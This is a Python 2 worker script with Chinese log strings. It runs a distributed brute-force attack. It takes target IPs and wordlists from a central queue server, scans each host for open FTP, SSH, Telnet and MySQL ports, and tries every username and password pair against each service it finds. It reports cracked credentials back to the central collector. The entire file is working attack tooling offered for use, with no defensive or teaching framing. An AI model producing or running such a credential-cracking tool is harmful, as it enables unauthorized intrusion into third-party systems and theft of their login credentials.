#!/usr/bin/env python
# -*- coding: utf-8 -*-

import logging
import argparse
import sys

from multiprocessing.managers import BaseManager, BaseProxy
from multiprocessing import Queue

from ftplib import FTP
import paramiko
import telnetlib
import MySQLdb

class classlog(object):
    """log class"""
    def __init__(self,logfilename="log.txt",level="INFO"):
        level = level if level in ['CRITICAL','ERROR','WARNING','INFO','DEBUG','NOTSET'] else 'INFO'
        self.logger = logging.getLogger("classlog")
        self.logger.setLevel(logging.DEBUG)
        Fileformatter = logging.Formatter("%(asctime)s - %(filename)s - %(levelname)-8s:%(message)s",
        datefmt='%Y-%m-%d %I:%M:%S %p')
        Streamformatter = logging.Formatter("%(asctime)s %(filename)s %(levelname)s:%(message)s",
        datefmt='%Y-%m-%d %I:%M:%S')# ,filename='example.log')

        Filelog = logging.FileHandler(logfilename)
        Filelog.setFormatter(Fileformatter)
        Filelog.setLevel(logging.DEBUG)

        Streamlog = logging.StreamHandler()
        Streamlog.setFormatter(Streamformatter)
        Streamlog.setLevel(level)

        self.logger.addHandler(Filelog)
        self.logger.addHandler(Streamlog)

    def debug(self,msg):
        self.logger.debug(msg)

    def info(self,msg):
        self.logger.info(msg)

    def warn(self,msg):
        self.logger.warn(msg)

    def error(self,msg):
        self.logger.error(msg)

    def critical(self,msg):
        self.logger.critical(msg)

class QueueManager(BaseManager):pass

class IteratorProxy(BaseProxy):
    def __iter__(self):
        print self
        return self

def con_ftp(ip, port=21, timeout=1):
    try:
        ftp=FTP()
        ftp.connect(ip,port,timeout=timeout)
        return True
    except Exception, e:
        return False

def con_ssh(ip, port=22, timeout=1):

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        a = ssh.connect(ip,port,"username","password",timeout=timeout)
    except paramiko.ssh_exception.AuthenticationException:
        return True
    except:
        return False

def con_telnet(ip, port=23, timeout=1):
    try:
        telnetlib.Telnet(ip, port, timeout=timeout)
        return True
    except:
        return False

def con_mysql(ip, port=3306):
    try:
        MySQLdb.connect(ip, "root", "root", port=port)
        return True
    except Exception, e:
        if "YES" in e[1]:
            return True
        else:
            return False

def login_ftp(ip, username, password, port=21, timeout=1):
    try:
        ftp=FTP()
        ftp.connect(ip,port,timeout=timeout)
        ftp.login(username,password)
        return True
    except Exception, e:
        return False

def login_ssh(ip, username, password, port=22, timeout=1):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        a = ssh.connect(ip,port,username,password,timeout=timeout)
        if a == None:
            return True
    except Exception, e:
        return False
    # stdin, stdout, stderr = ssh.exec_command("command")
    # print stdout.readlines()
    ssh.close

def login_telnet(ip, username, password, port=23, timeout=1):
    #连接Telnet服务器
    try:
        tn = telnetlib.Telnet(ip, port, timeout=timeout)

        #输入登录用户名
        tn.read_until("login: ")
        tn.write(str(username)+'\n')

        # 输入登录密码
        tn.read_until("Password: ")
        tn.write(str(password)+'\n')

        msg = tn.read_until("login")
        if "incorrect" in msg:
            return False
        else:
            return True
    except:
        return False

def login_mysql(ip, usernaem, password, port=3306, timeout=1):
    try:
        MySQLdb.connect(ip, usernaem, password)
        return True
    except:
        return False

LOG = classlog("log.txt","INFO")

userlist = []
passlist = []

ftplist = []
sshlist = []
tellist = []
sqllist = []

QueueManager.register('get_ip_queue')
QueueManager.register('get_re_queue')
QueueManager.register('get_userlist',proxytype=IteratorProxy)
QueueManager.register('get_passlist',proxytype=IteratorProxy)

if len(sys.argv) == 1:
	print u"./taskworker.py 192.168.0.1"
	sys.exit()

ip = sys.argv[1]

m = QueueManager(address=('192.168.3.104', 50000), authkey='abracadabra')
LOG.info(u"连接服务器" + ip)

try:
    m.connect()
except:
    LOG.error(u"连接服务器失败")
    sys.exit()
LOG.info(u"连接服务器成功\n")

ip_queue = m.get_ip_queue()
re_queue = m.get_re_queue()

for u in m.get_userlist()._getvalue():
    userlist.append(u)

for p in m.get_passlist()._getvalue():
    passlist.append(p)

LOG.info(
    u"信息:" + \
    u" \n| 账号总数: |" + str(userlist.__len__()).rjust(6) + \
    u" |\n| 密码总数: |" + str(passlist.__len__()).rjust(6) + \
    u" |\n| 剩余IP数: |" + str(ip_queue.qsize()).rjust(6) + " |"
)

LOG.info(u"开始探测端口\n")
while not ip_queue.empty():
    ip = ip_queue.get()

    if con_ftp(ip):
        ftplist.append(ip)
        LOG.info(ip.ljust(16) + " OPEN " + "ftp".rjust(6))
    else:
        LOG.info(ip.ljust(16) + " OFF  " + "ftp".rjust(6))
    if con_ssh(ip):
        sshlist.append(ip)
        LOG.info(ip.ljust(16) + " OPEN " + "ssh".rjust(6))
    else:
        LOG.info(ip.ljust(16) + " OFF  " + "ssh".rjust(6))

    if con_telnet(ip):
        tellist.append(ip)
        LOG.info(ip.ljust(16) + " OPEN " + "telnet".rjust(6))
    else:
        LOG.info(ip.ljust(16) + " OFF  " + "telnet".rjust(6))

    if con_mysql(ip):
        sqllist.append(ip)
        LOG.info(ip.ljust(16) + " OPEN " + "mysql".rjust(6))
    else:
        LOG.info(ip.ljust(16) + " OFF  " + "mysql".rjust(6))

print
LOG.info(u"开始破解\n")

def run(iplist, msg, func):
    for u in userlist:
        for p in passlist:
            for ip in iplist:
                if func(ip,u,p):
                    LOG.info(ip.ljust(16) + " SUCESS " + msg.rjust(6) + " " + u + ":" + p)
                    re_queue.put(ip.ljust(16) + " SUCESS " + msg.rjust(6) + " " + u + ":" + p)
                    return

run(ftplist, "FTP", login_ftp)
run(sshlist, "SSH", login_ssh)
run(tellist, "TELNET", login_telnet)
run(sqllist,"MYSQL", login_mysql)

LOG.info(u"完成")
